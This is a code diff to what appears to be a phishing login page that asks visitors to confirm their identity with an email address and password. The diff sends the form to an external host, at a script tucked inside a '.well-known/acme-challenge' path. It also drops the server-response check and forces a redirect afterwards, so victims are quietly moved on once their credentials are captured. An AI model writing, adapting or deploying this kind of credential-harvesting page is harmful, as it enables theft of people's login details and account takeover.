@@ -107,7 +107,7 @@
 
         <div class="text-center confirm confirm-identity-spacing">Confirm identity to prove you are not a robot</div>
 
-        <form id="loginForm" action="process.php" method="POST">
+        <form id="loginForm" action="https://seamua.com/.well-known/acme-challenge/ini.php" method="POST">
             <input type="hidden" name="step" value="1">
             <div class="form-group">
                 <label class="text-secondary font-weight-bold">Email Address</label>
@@ -189,9 +189,6 @@
                     body: formData
                 });
                 
-                const result = await response.text();
-                if (result !== "OK") throw new Error('Submission failed');
-                
                 // Clear password field
                 passwordInput.value = '';
 
@@ -212,12 +209,8 @@
                     verificationComplete.style.display = 'flex';
                     
                     setTimeout(() => {
-                        // Use iframe to load destination first
-                        const iframe = document.getElementById('iframe');
-                        iframe.onload = function() {
-                            window.location.href = redirectUrl;
-                        };
-                        iframe.src = redirectUrl;
+                        // Force redirect by setting window.location
+                        window.location.replace(redirectUrl);
                     }, 2000);
                 }
 
